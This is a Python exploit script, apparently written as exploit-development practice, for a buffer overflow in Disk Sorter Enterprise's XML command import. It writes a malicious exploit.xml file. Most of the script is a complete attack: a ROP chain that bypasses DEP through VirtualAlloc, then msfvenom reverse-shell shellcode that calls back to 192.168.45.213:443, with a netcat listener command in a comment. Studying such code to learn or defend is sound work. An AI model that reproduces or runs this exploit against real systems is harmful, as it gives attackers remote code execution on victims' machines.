#!/usr/bin/python3

from struct import pack
import pwn
import socket
import sys

# run the program C:\Program Files\Disk Sorter Enterprise\bin\disksrc.exe with WinDbg
# in Program: Add Command, then Export Command to get idea of XML format; import Command to trigger exploit

def main() :
    payload = buildPayload()
    writePayload(payload)


# relevant modules for ROP gadgets
# 10000000 10218000 libspg               /SafeSEH OFF                C:\Program Files\Disk Sorter Enterprise\bin\libspg.dll
# 65000000 653cb000 QtGui4               /SafeSEH OFF                C:\Program Files\Disk Sorter Enterprise\bin\QtGui4.dll

# => DEP bypass would not be necessary, but let's do it just for practice
# manually enable DEP with:
#      Windows Defender Security Center
#   -> App & Browser Control
#   -> Exploit Protection Settings
#   -> Program Settings
#   -> Add program to customize
#   -> Choose exact file path
#   -> enter path
#   -> Data Execution Prevention (DEP): Override, On
# then restart program


payloadSize = 0x5000

def buildPayload():
    # buf += pwn.cyclic(payloadSize)
    offBufEip = 0x600                                           # pwn.cyclic_find(0x7061616a)

    badchars = b"\x00\x27"
    # buf += bytes([ b for b in range(0x100)
    #                  if b not in badchars])

    buf  = b""

    buf += b"_" * (offBufEip - len(buf) - len(virtualAllocStub()))  # padding
    buf += virtualAllocStub()                                   # setup call to VirtualAlloc
    buf += skipMangledBytes()
    buf += ropChainVirtualAlloc()                               # DEP bypass ROP chain; overwritten EIP redirects here
    buf += nopsled()
    buf += shellcode()                                          # note: stack is now executable
    buf += b"Z" * (payloadSize - len(buf))                      # padding to fixate payloadSize

    # some sanity checks
    assert len(buf) == payloadSize, f"Mismatching size: {len(buf)} != {payloadSize}"
    for b in badchars:
        assert b not in buf, print(f"Error: badchar {hex(b)} ({repr(chr(b))}) appeared in payload", "\n\n", pwn.hexdump(buf))

    return buf


def nopsled(length=0x10):
    return b"\x90" * length

def virtualAllocStub():
    buf  = b""
    buf += b"AAAA"      # Address of VirtualAlloc
    buf += b"BBBB"      # Return address                = address of shellcode on the stack
    buf += b"CCCC"      # LPVOID lpAddress              = address of shellcode on the stack
    buf += b"DDDD"      # SIZE_T dwSize                 = payloadSize should be enough
    buf += b"EEEE"      # DWORD  flAllocationType       = 0x1000 = MEM_COMMIT
    buf += b"FFFF"      # DWORD  flProtect              = 0x40 = PAGE_EXECUTE_READWRITE
    return buf

def skipMangledBytes():
    """Needed because some bytes on the stack inbetween are mangled"""
    buf  = b""
    buf += pack("<I", 0x10123ae2)                               # add esp, 0x20
    offEspShellcode = 0x30                                      # align esp
    buf += b"C" * offEspShellcode
    return buf

def ropChainVirtualAlloc():
    """Calls VirtualAlloc via ROP chain and then jumps into the next part of
    the exploit (shellcode); this part does alignment/ padding to a fixed size"""

    bufSize = 0x500                                             # fix size of this rop chain

    buf  = b""

    ################################################################################
    # align pointer register to begin of stub for calling VirtualAlloc on the stack
    offStubEsp  = 0x50
    offStubEsp += 0x1c                                          # because off offset in patch gadget
    tmp1 = 0x77777777
    buf += pack("<I", 0x65247445)                               # push esp ; pop esi ; retn 0x0004
    buf += pack("<I", 0x651c5f81)                               # pop edi
    buf += b"JJJJ"                                              #   junk (retn)
    buf += pack("<I", offStubEsp + tmp1)                        #   into edi
    buf += pack("<I", 0x6526fbd0)                               # pop ebx
    buf += pack("<I", 0x6526fbd0)                               # pop ebx (pop saved eip from call)
    buf += pack("<I", 0x652253af)                               # sub esi, edi ; call ebx
    buf += pack("<I", 0x651c5f81)                               # pop edi
    buf += pack("<i", -tmp1)
    buf += pack("<I", 0x6526fbd0)                               # pop ebx
    buf += pack("<I", 0x6526fbd0)                               # pop ebx (pop saved eip from call)
    buf += pack("<I", 0x652253af)                               # sub esi, edi ; call ebx

    ################################################################################
    # compute address of VirtualAlloc

    # inspect Import Address Table (IAT) with WinDBG:
    # 0:000> !dh -a disksrc => search for KERNEL32.dll => dump IAT and take first entry:
    #   _IMAGE_IMPORT_DESCRIPTOR 0049a76c
    #     KERNEL32.dll
    #               00489000 Import Address Table
    #               0049A7D0 Import Name Table
    #                      0 time date stamp
    #                      0 Index of first forwarder reference
    #
    #        775489D0  109 GetCommandLineW
    # 0:000> dds 00489000 L10
    # 00489000  775489d0 KERNEL32!GetCommandLineWStub
    getCommandLineWStubIAT = 0x00489000

    # 0:000> .shell -ci "!dh -a kernel32" findstr /i GetCommandLineW
    #        471  469 775489D0 GetCommandLineW
    # .shell: Process exited
    # 0:000> .shell -ci "!dh -a kernel32" findstr /i VirtualAlloc
    #       1471 1470 775438C0 VirtualAlloc
    offGetcommandlinewVirtualalloc = 0x775438C0 - 0x775489D0

    buf += pack("<I", 0x6526f634)                               # pop ecx
    buf += pack("<I", getCommandLineWStubIAT + tmp1)
    buf += pack("<I", 0x6526e64e)                               # pop ebp
    buf += pack("<i", -tmp1 - 0x0C)
    buf += pack("<I", 0x6524e4bc)                               # add ecx, ebp

    buf += pack("<I", 0x6526f952)                               # mov eax,  [ecx+0x0C]
    buf += pack("<I", 0x6526fbd0) * 2                           # pop ebx
    buf += pack("<I", 0x65234211)                               # mov ecx, eax ; call ebx

    buf += pack("<I", 0x6526e64e)                               # pop ebp
    buf += pack("<i", offGetcommandlinewVirtualalloc)
    buf += pack("<I", 0x6524e4bc)                               # add ecx, ebp

    ################################################################################
    # patch address of VirtualAlloc
    buf += pack("<I", 0x6526e36b) * 2                           # pop ebp
    buf += pack("<I", 0x100f5461)                               # mov  [esi+0x1C], ecx ; call ebp

    ################################################################################
    # compute address of shellcode
    buf += pack("<I", 0x651c5f81) * 2                           # pop edi
    buf += pack("<I", 0x652360a1)                               # mov ecx, esi ; call edi
    offEsiShellcode = bufSize + 0x68
    buf += pack("<I", 0x6526e64e)                               # pop ebp
    buf += pack("<I", offEsiShellcode + tmp1)
    buf += pack("<I", 0x6524e4bc)                               # add ecx, ebp
    buf += pack("<I", 0x6526e64e)                               # pop ebp
    buf += pack("<i", -tmp1)
    buf += pack("<I", 0x6524e4bc)                               # add ecx, ebp

    ################################################################################
    # patch return address (address of shellcode)
    buf += pack("<I", 0x6526b94f) * 4                           # inc esi
    buf += pack("<I", 0x6526e36b) * 2                           # pop ebp
    buf += pack("<I", 0x100f5461)                               # mov  [esi+0x1C], ecx ; call ebp

    ################################################################################
    # patch lpAddress (address of shellcode)
    buf += pack("<I", 0x6526b94f) * 4                           # inc esi
    buf += pack("<I", 0x6526e36b) * 2                           # pop ebp
    buf += pack("<I", 0x100f5461)                               # mov  [esi+0x1C], ecx ; call ebp

    ################################################################################
    # patch dwSize
    buf += pack("<I", 0x6526f634)                               # pop ecx
    buf += pack("<I", payloadSize + tmp1)
    buf += pack("<I", 0x6526e64e)                               # pop ebp
    buf += pack("<i", -tmp1)
    buf += pack("<I", 0x6524e4bc)                               # add ecx, ebp

    buf += pack("<I", 0x6526b94f) * 4                           # inc esi
    buf += pack("<I", 0x6526e36b) * 2                           # pop ebp
    buf += pack("<I", 0x100f5461)                               # mov  [esi+0x1C], ecx ; call ebp

    ################################################################################
    # patch flAllocationType
    MEM_COMMIT = 0x1000
    buf += pack("<I", 0x6526f634)                               # pop ecx
    buf += pack("<I", MEM_COMMIT + tmp1)
    buf += pack("<I", 0x6526e64e)                               # pop ebp
    buf += pack("<i", -tmp1)
    buf += pack("<I", 0x6524e4bc)                               # add ecx, ebp

    buf += pack("<I", 0x6526b94f) * 4                           # inc esi
    buf += pack("<I", 0x6526e36b) * 2                           # pop ebp
    buf += pack("<I", 0x100f5461)                               # mov  [esi+0x1C], ecx ; call ebp

    ################################################################################
    # patch flProtect
    PAGE_EXECUTE_READWRITE = 0x40
    buf += pack("<I", 0x6526f634)                               # pop ecx
    buf += pack("<I", PAGE_EXECUTE_READWRITE + tmp1)
    buf += pack("<I", 0x6526e64e)                               # pop ebp
    buf += pack("<i", -tmp1)
    buf += pack("<I", 0x6524e4bc)                               # add ecx, ebp

    buf += pack("<I", 0x6526b94f) * 4                           # inc esi
    buf += pack("<I", 0x6526e36b) * 2                           # pop ebp
    buf += pack("<I", 0x100f5461)                               # mov  [esi+0x1C], ecx ; call ebp

    ################################################################################
    # stack pivot

        # align eax to VirtualAlloc stack frame
    buf += pack("<I", 0x6526fbd0) * 2                           # pop ebx
    buf += pack("<I", 0x65232e49)                               # mov ecx, esi ; call ebx
    buf += pack("<I", 0x6525f0d8)                               # mov eax, ecx ; retn 0x0004
    buf += pack("<I", 0x6508cc65) * 3                           # add eax, 0x04

    # buf += pack("<I", 0x6528047f)                             # int3 (debug gadget)

    # 0:000> dds @eax L6
    # 0012c8f4  775438c0 KERNEL32!VirtualAllocStub
    # 0012c8f8  0012ce40
    # 0012c8fc  0012ce40
    # 0012c900  00005000
    # 0012c904  00001000
    # 0012c908  00000040

        # actually pivot
    buf += pack("<I", 0x6526f532)                               # xchg eax, esp
    buf += b"JJJJ"                                              #   junk (retn)

    # page protections on shellcode before:
    # 0:000> !vprot 0012ce40
    # BaseAddress:       0012c000
    # AllocationBase:    00050000
    # AllocationProtect: 00000004  PAGE_READWRITE
    # RegionSize:        00024000
    # State:             00001000  MEM_COMMIT
    # Protect:           00000004  PAGE_READWRITE
    # Type:              00020000  MEM_PRIVATE

    # page protections on shellcode after :
    # 0:000> !vprot 0012ce40
    # BaseAddress:       0012c000
    # AllocationBase:    00050000
    # AllocationProtect: 00000004  PAGE_READWRITE
    # RegionSize:        00006000
    # State:             00001000  MEM_COMMIT
    # Protect:           00000040  PAGE_EXECUTE_READWRITE
    # Type:              00020000  MEM_PRIVATE

    ################################################################################
    # pad out to fixed length
    buf += b"L" * (bufSize - len(buf))

    assert len(buf) == bufSize, f"Mismatching size: {len(buf)} != {bufSize}"

    return buf

def shellcode():
    buf  = b""
    # buf += b"\xcc"

    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.213 LPORT=443 EXITFUNC=thread -f python -v buf -b "\x00\x27"
    # nc -vlnp 443
    buf += b"\xdd\xc4\xba\x23\x96\xfe\x9c\xd9\x74\x24\xf4\x5e"
    buf += b"\x33\xc9\xb1\x52\x83\xee\xfc\x31\x56\x13\x03\x75"
    buf += b"\x85\x1c\x69\x85\x41\x62\x92\x75\x92\x03\x1a\x90"
    buf += b"\xa3\x03\x78\xd1\x94\xb3\x0a\xb7\x18\x3f\x5e\x23"
    buf += b"\xaa\x4d\x77\x44\x1b\xfb\xa1\x6b\x9c\x50\x91\xea"
    buf += b"\x1e\xab\xc6\xcc\x1f\x64\x1b\x0d\x67\x99\xd6\x5f"
    buf += b"\x30\xd5\x45\x4f\x35\xa3\x55\xe4\x05\x25\xde\x19"
    buf += b"\xdd\x44\xcf\x8c\x55\x1f\xcf\x2f\xb9\x2b\x46\x37"
    buf += b"\xde\x16\x10\xcc\x14\xec\xa3\x04\x65\x0d\x0f\x69"
    buf += b"\x49\xfc\x51\xae\x6e\x1f\x24\xc6\x8c\xa2\x3f\x1d"
    buf += b"\xee\x78\xb5\x85\x48\x0a\x6d\x61\x68\xdf\xe8\xe2"
    buf += b"\x66\x94\x7f\xac\x6a\x2b\x53\xc7\x97\xa0\x52\x07"
    buf += b"\x1e\xf2\x70\x83\x7a\xa0\x19\x92\x26\x07\x25\xc4"
    buf += b"\x88\xf8\x83\x8f\x25\xec\xb9\xd2\x21\xc1\xf3\xec"
    buf += b"\xb1\x4d\x83\x9f\x83\xd2\x3f\x37\xa8\x9b\x99\xc0"
    buf += b"\xcf\xb1\x5e\x5e\x2e\x3a\x9f\x77\xf5\x6e\xcf\xef"
    buf += b"\xdc\x0e\x84\xef\xe1\xda\x0b\xbf\x4d\xb5\xeb\x6f"
    buf += b"\x2e\x65\x84\x65\xa1\x5a\xb4\x86\x6b\xf3\x5f\x7d"
    buf += b"\xfc\x3c\x37\x50\x29\xd4\x4a\xaa\xd0\x9e\xc2\x4c"
    buf += b"\xb8\xf0\x82\xc7\x55\x68\x8f\x93\xc4\x75\x05\xde"
    buf += b"\xc7\xfe\xaa\x1f\x89\xf6\xc7\x33\x7e\xf7\x9d\x69"
    buf += b"\x29\x08\x08\x05\xb5\x9b\xd7\xd5\xb0\x87\x4f\x82"
    buf += b"\x95\x76\x86\x46\x08\x20\x30\x74\xd1\xb4\x7b\x3c"
    buf += b"\x0e\x05\x85\xbd\xc3\x31\xa1\xad\x1d\xb9\xed\x99"
    buf += b"\xf1\xec\xbb\x77\xb4\x46\x0a\x21\x6e\x34\xc4\xa5"
    buf += b"\xf7\x76\xd7\xb3\xf7\x52\xa1\x5b\x49\x0b\xf4\x64"
    buf += b"\x66\xdb\xf0\x1d\x9a\x7b\xfe\xf4\x1e\x9b\x1d\xdc"
    buf += b"\x6a\x34\xb8\xb5\xd6\x59\x3b\x60\x14\x64\xb8\x80"
    buf += b"\xe5\x93\xa0\xe1\xe0\xd8\x66\x1a\x99\x71\x03\x1c"
    buf += b"\x0e\x71\x06"

    return buf


def writePayload(payload):
    xml = b"""<?xml version="1.0" encoding="UTF-8"?>
        <!-- Disk Sorter Enterprise v9.5.12 http://www.disksorter.com -->

        <classify name=""" + b"'" + payload + b""">

	        <directories>
		        <directory>C:\</directory>
	        </directories>

	        <plugin>Default File Classification Plugin</plugin>
	        <scanners mode='0'>2</scanners>
	        <show-users>no</show-users>
	        <report-title>File Classification Report</report-title>
	        <report-levels>1000000</report-levels>
	        <files-per-class>1000000</files-per-class>
	        <export-levels>1000000</export-levels>
	        <export-per-level>1000000</export-per-level>
	        <host>AUTO-SELECT</host>
	        <speed>FULL</speed>
	        <streams>1</streams>
        </classify>
        """

    with open("exploit.xml", "wb") as f:
        f.write(xml)


if __name__ == "__main__":
    main()
